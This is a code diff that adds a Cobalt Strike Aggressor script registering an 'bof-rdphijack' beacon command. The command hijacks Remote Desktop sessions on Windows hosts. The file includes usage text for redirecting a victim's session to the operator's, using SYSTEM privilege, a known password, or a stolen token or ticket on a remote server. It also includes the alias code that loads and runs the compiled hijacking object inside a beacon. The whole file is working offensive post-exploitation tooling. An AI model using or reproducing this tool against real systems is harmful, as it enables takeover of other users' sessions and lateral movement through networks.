@@ -1,0 +1,34 @@
+beacon_command_register("bof-rdphijack", "BOF implementation of RDP session hijacking.", "\nUsage: bof-rdphijack [your console session id] [target session id to hijack] [password|server] [argument]\n
+Command         Description
+--------        -----------
+password        Specifies the password of the user who owns the session to which you want to connect.
+server          Specifies the remote server that you want to perform RDP hijacking.
+
+Sample usage
+--------
+Redirect session 2 to session 1 (require SYSTEM privilege):
+bof-rdphijack 1 2
+
+Redirect session 2 to session 1 with password of the user who owns the session 2 (require high integrity beacon):
+bof-rdphijack 1 2 password P@ssw0rd123
+
+Redirect session 2 to session 1 for a remote server (require token/ticket of the user who owns the session 2):
+bof-rdphijack 1 2 server SQL01.lab.internal\n");
+
+alias bof-rdphijack {
+	$barch  = barch($1);
+	if(size(@_) < 3)
+	{
+		berror($1, "Check usage: help bof-rdphijack");
+	        return;
+	}
+	$session = $2;
+	$targetSession = $3;
+	$command = $4;
+	$parameter = $5;
+	$args = bof_pack($1, "iiZZ", $session, $targetSession, $command, $parameter);
+	$handle = openf(script_resource("rdphijack. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+	beacon_inline_execute($1, $data, "go", $args);
+}
